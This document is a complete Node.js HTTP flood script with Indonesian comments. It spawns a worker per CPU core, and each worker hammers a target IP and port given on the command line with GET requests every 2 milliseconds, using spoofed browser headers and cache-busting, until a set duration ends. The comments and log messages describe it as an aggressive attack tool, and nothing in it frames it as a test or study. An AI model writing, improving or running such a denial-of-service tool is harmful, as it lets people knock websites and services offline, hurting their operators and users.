const http = require('http');
const cluster = require('cluster');
const os = require('os');

if (cluster.isMaster) {
    console.log(`Master process is running`);

    // Buat worker sebanyak jumlah CPU yang tersedia
    for (let i = 0; i < os.cpus().length; i++) {
        cluster.fork();
    }

    cluster.on('exit', (worker, code, signal) => {
        console.log(`Worker ${worker.process.pid} died`);
        cluster.fork(); // Fork worker baru kalau ada yang mati
    });

} else {
    const targetIP = process.argv[2];
    const targetPort = process.argv[3];
    const duration = process.argv[4] * 1000;
    const startTime = Date.now();

    const flood = () => {
        const options = {
            hostname: targetIP,
            port: targetPort,
            path: '/',
            method: 'GET',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/58.0.3029.110 Safari/537.36',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache'
            }
        };

        const req = http.request(options, res => {
            res.on('data', () => {});
            res.on('end', () => {});
        });

        req.on('error', error => {});
        req.end();

        if (Date.now() - startTime > duration) {
            console.log(`Worker ${process.pid} finished attacking`);
            process.exit(0);
        }
    };

    console.log(`Worker ${process.pid} started attacking`);
    
    // Set interval yang lebih intensif
    const interval = setInterval(flood, 2); // 2ms interval untuk serangan lebih agresif
} 
